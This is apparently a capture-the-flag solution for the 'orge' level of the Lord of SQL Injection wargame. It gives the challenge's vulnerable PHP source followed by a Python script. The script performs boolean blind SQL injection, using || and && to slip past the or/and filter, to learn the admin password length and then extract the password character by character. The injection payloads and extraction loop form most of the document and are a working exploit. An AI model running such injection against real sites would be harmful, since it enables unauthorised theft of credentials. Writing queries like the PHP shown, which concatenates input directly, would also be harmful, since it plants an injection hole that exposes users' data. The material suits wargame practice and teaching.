'''
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_orge where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orge where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orge"); 
  highlight_file(__FILE__); 
?>
'''
import requests
from urllib import parse

# admin의 패스워드를 파악해야함
# or, and를 못씀
host = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw="
cookies = {"PHPSESSID" : "8s7khiq67rue3qlsffsskni093"}
password_length = 0
s = requests.Session()

print("password length find start !! ")
for i in range(1, 100) :    
    param = f"'||id='admin' && length(pw)={i} -- -"
    res = s.get(host + parse.quote(param), cookies=cookies)        
    if "Hello admin" in res.text :
        print(f"password length is {i}")       
        password_length = i 
        break  
print("password length find end !! ")

# password length is 8

# 패스워드 추출
admin_password = ""
for i in range(1, password_length + 1) :
    for j in range(47, 123) : # 48~57 0~9 / 65 ~90 A-Z 97~122 a-z    
        param = f"'||id='admin' && ascii(substr(pw, {str(i)}, 1)) = {str(j)} -- -"
        res = s.get(host + parse.quote(param), cookies=cookies)
        if "Hello admin" in res.text :
            admin_password += chr(j)
            break
    print(f"now password ... {admin_password}")
print(f"admin password is {admin_password}")